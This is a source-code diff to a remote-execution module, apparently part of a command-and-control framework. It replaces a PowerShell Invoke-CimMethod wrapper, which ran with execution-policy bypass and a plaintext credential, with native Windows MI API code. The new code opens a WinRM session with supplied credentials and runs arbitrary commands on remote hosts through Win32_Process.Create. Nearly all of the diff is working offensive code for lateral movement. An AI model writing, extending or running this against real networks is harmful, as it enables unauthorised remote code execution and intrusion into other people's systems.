@@ -6,7 +6,7 @@
 
 #ifdef _WIN32
 #include <windows.h>
-#include <cstdio>
+#include <mi.h>
 #endif
 
 using namespace std;
@@ -42,7 +42,7 @@ std::string CimExec::getInfo()
     std::ostringstream oss;
 #ifdef BUILD_TEAMSERVER
     oss << "CIM/MI Execution Module:\n";
-    oss << "Invoke Win32_Process.Create through the MI API (via PowerShell CIM)." << '\n';
+    oss << "Invoke Win32_Process.Create using the native MI (CIM) API over WS-Man." << '\n';
     oss << "Options:" << '\n';
     oss << "  -h <host>            Remote host." << '\n';
     oss << "  -n <namespace>      Namespace (default root/cimv2)." << '\n';
@@ -200,62 +200,280 @@ int CimExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg
 #ifdef _WIN32
 namespace
 {
-    std::string escapeSingleQuotes(const std::string& input)
+    std::wstring widen(const std::string& value)
     {
-        std::string escaped;
-        escaped.reserve(input.size() * 2);
-        for (char ch : input)
+        if (value.empty())
         {
-            escaped.push_back(ch);
-            if (ch == '\'')
+            return std::wstring();
+        }
+
+        int required = MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0);
+        if (required <= 0)
+        {
+            return std::wstring();
+        }
+
+        std::wstring buffer(static_cast<size_t>(required), L'\0');
+        MultiByteToWideChar(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required);
+        return buffer;
+    }
+
+    std::string narrow(const std::wstring& value)
+    {
+        if (value.empty())
+        {
+            return std::string();
+        }
+
+        int required = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
+        if (required <= 0)
+        {
+            return std::string();
+        }
+
+        std::string buffer(static_cast<size_t>(required), '\0');
+        WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), buffer.data(), required, nullptr, nullptr);
+        return buffer;
+    }
+
+    std::string narrowMiString(const MI_Char* value)
+    {
+        if (value == nullptr)
+        {
+            return std::string();
+        }
+        return narrow(std::wstring(value));
+    }
+
+    struct DomainSplit
+    {
+        std::wstring domain;
+        std::wstring user;
+    };
+
+    DomainSplit splitDomainUser(const std::string& input)
+    {
+        DomainSplit result;
+        std::string domain;
+        std::string user = input;
+        const size_t pos = input.find('\\');
+        if (pos != std::string::npos)
+        {
+            domain = input.substr(0, pos);
+            user = input.substr(pos + 1);
+        }
+
+        result.domain = widen(domain);
+        result.user = widen(user);
+        return result;
+    }
+
+    std::string formatMiError(MI_Result result, const MI_Char* message, MI_Instance* details)
+    {
+        std::ostringstream oss;
+        oss << "MI error 0x" << std::hex << std::uppercase << static_cast<unsigned int>(result);
+        oss << std::nouppercase << std::dec;
+
+        std::string description = narrowMiString(message);
+        if (description.empty() && details != nullptr)
+        {
+            MI_Value value;
+            MI_Type type;
+            MI_Uint32 flags;
+            if (MI_Instance_GetElement(details, MI_T("Message"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
+                type == MI_STRING && value.string != nullptr)
             {
-                escaped.push_back('\'');
+                description = narrowMiString(value.string);
             }
         }
-        return escaped;
+
+        if (!description.empty())
+        {
+            oss << ": " << description;
+        }
+
+        oss << '\n';
+        return oss.str();
     }
 }
 
 std::string CimExec::invoke(const Parameters& params) const
 {
-    std::ostringstream powershell;
-    powershell << "powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"";
-    powershell << "$ns='" << escapeSingleQuotes(params.namespaceName) << "';";
-    powershell << "$cmd='" << escapeSingleQuotes(params.command) << "'";
-    powershell << ";$args='" << escapeSingleQuotes(params.arguments) << "'";
+    MI_Application app = MI_APPLICATION_NULL;
+    MI_Result result = MI_Application_Initialize(0, MI_T("C2CoreCimExec"), nullptr, &app);
+    if (result != MI_RESULT_OK)
+    {
+        return formatMiError(result, nullptr, nullptr);
+    }
 
+    MI_DestinationOptions destOptions = MI_DESTINATIONOPTIONS_NULL;
+    MI_DestinationOptions_Initialize(&destOptions);
+    MI_DestinationOptions* destOptionsPtr = nullptr;
+
+    std::wstring passwordWide;
+    MI_UserCredentials credentials{};
     if (!params.username.empty())
     {
-        powershell << ";$sec=ConvertTo-SecureString '" << escapeSingleQuotes(params.password) << "' -AsPlainText -Force";
-        powershell << ";$cred=New-Object System.Management.Automation.PSCredential('" << escapeSingleQuotes(params.username) << "',$sec)";
-        powershell << ";Invoke-CimMethod -ComputerName '" << escapeSingleQuotes(params.hostname) << "' -Namespace $ns -ClassName Win32_Process -MethodName Create -Credential $cred -Arguments @{ CommandLine=($cmd + ' ' + $args).Trim() }";
-    }
-    else
-    {
-        powershell << ";Invoke-CimMethod -ComputerName '" << escapeSingleQuotes(params.hostname) << "' -Namespace $ns -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine=($cmd + ' ' + $args).Trim() }";
+        DomainSplit split = splitDomainUser(params.username);
+        passwordWide = widen(params.password);
+
+        credentials.authenticationType = MI_AUTH_TYPE_DEFAULT;
+        credentials.credentials.usernamePassword.domain = split.domain.empty() ? nullptr : split.domain.c_str();
+        credentials.credentials.usernamePassword.username = split.user.c_str();
+        credentials.credentials.usernamePassword.password = passwordWide.c_str();
+
+        result = MI_DestinationOptions_SetCredentials(&destOptions,
+                                                      MI_AUTH_TYPE_DEFAULT,
+                                                      &credentials,
+                                                      MI_FALSE,
+                                                      nullptr,
+                                                      nullptr);
+        if (result != MI_RESULT_OK)
+        {
+            MI_Application_Close(&app);
+            return formatMiError(result, nullptr, nullptr);
+        }
+
+        destOptionsPtr = &destOptions;
     }
 
-    powershell << "\"";
+    std::wstring hostWide = widen(params.hostname);
+    std::wstring namespaceWide = widen(params.namespaceName);
 
-    FILE* pipe = _popen(powershell.str().c_str(), "rt");
-    if (!pipe)
+    MI_Session session = MI_SESSION_NULL;
+    result = MI_Application_NewSession(&app,
+                                       MI_T("WINRM"),
+                                       hostWide.c_str(),
+                                       destOptionsPtr,
+                                       nullptr,
+                                       nullptr,
+                                       &session);
+    if (result != MI_RESULT_OK)
     {
-        return "Failed to start PowerShell for CIM execution.\n";
+        MI_Application_Close(&app);
+        return formatMiError(result, nullptr, nullptr);
     }
 
-    std::ostringstream output;
-    char buffer[4096];
-    while (fgets(buffer, sizeof(buffer), pipe))
+    std::wstring commandLine = widen(params.command);
+    if (!params.arguments.empty())
     {
-        output << buffer;
+        commandLine += L" ";
+        commandLine += widen(params.arguments);
     }
-    _pclose(pipe);
 
-    std::string result = output.str();
-    if (result.empty())
+    MI_Instance* inParams = nullptr;
+    result = MI_Application_NewInstance(&app, MI_T("Win32_Process_Create"), nullptr, &inParams);
+    if (result != MI_RESULT_OK)
     {
-        result = "Command executed with no output.\n";
+        MI_Session_Close(&session, nullptr, nullptr);
+        MI_Application_Close(&app);
+        return formatMiError(result, nullptr, nullptr);
     }
-    return result;
+
+    MI_Value commandValue;
+    commandValue.string = commandLine.c_str();
+    result = MI_Instance_AddElement(inParams, MI_T("CommandLine"), &commandValue, MI_STRING, MI_FLAG_BORROW);
+    if (result != MI_RESULT_OK)
+    {
+        MI_Instance_Delete(inParams);
+        MI_Session_Close(&session, nullptr, nullptr);
+        MI_Application_Close(&app);
+        return formatMiError(result, nullptr, nullptr);
+    }
+
+    MI_Operation operation = MI_OPERATION_NULL;
+    MI_Session_Invoke(&session,
+                      0,
+                      nullptr,
+                      namespaceWide.c_str(),
+                      MI_T("Win32_Process"),
+                      MI_T("Create"),
+                      nullptr,
+                      inParams,
+                      nullptr,
+                      &operation);
+
+    MI_Boolean moreResults = MI_FALSE;
+    MI_Result finalResult = MI_RESULT_OK;
+    const MI_Char* errorMessage = nullptr;
+    MI_Instance* errorDetails = nullptr;
+    MI_Instance* outputInstance = nullptr;
+
+    std::ostringstream response;
+    bool haveData = false;
+    MI_Result getResult;
+
+    do
+    {
+        getResult = MI_Operation_GetInstance(&operation,
+                                             &outputInstance,
+                                             &moreResults,
+                                             &finalResult,
+                                             &errorMessage,
+                                             &errorDetails);
+        if (getResult != MI_RESULT_OK)
+        {
+            response.str(std::string());
+            response.clear();
+            response << formatMiError(getResult, errorMessage, errorDetails);
+            if (errorDetails != nullptr)
+            {
+                MI_Instance_Delete(errorDetails);
+            }
+            break;
+        }
+
+        if (outputInstance != nullptr)
+        {
+            MI_Value value;
+            MI_Type type;
+            MI_Uint32 flags;
+
+            if (MI_Instance_GetElement(outputInstance, MI_T("ReturnValue"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
+                type == MI_UINT32)
+            {
+                response << "ReturnValue: " << value.uint32 << '\n';
+                haveData = true;
+            }
+
+            if (MI_Instance_GetElement(outputInstance, MI_T("ProcessId"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
+                type == MI_UINT32)
+            {
+                response << "ProcessId: " << value.uint32 << '\n';
+                haveData = true;
+            }
+
+            MI_Instance_Delete(outputInstance);
+            outputInstance = nullptr;
+        }
+
+        if (errorDetails != nullptr)
+        {
+            MI_Instance_Delete(errorDetails);
+            errorDetails = nullptr;
+        }
+    }
+    while (moreResults == MI_TRUE);
+
+    if (finalResult != MI_RESULT_OK && getResult == MI_RESULT_OK)
+    {
+        response << formatMiError(finalResult, errorMessage, errorDetails);
+        if (errorDetails != nullptr)
+        {
+            MI_Instance_Delete(errorDetails);
+        }
+    }
+
+    if (!haveData && response.str().empty())
+    {
+        response << "Command executed with no output.\n";
+    }
+
+    MI_Operation_Close(&operation);
+    MI_Instance_Delete(inParams);
+    MI_Session_Close(&session, nullptr, nullptr);
+    MI_Application_Close(&app);
+
+    return response.str();
 }
 #endif
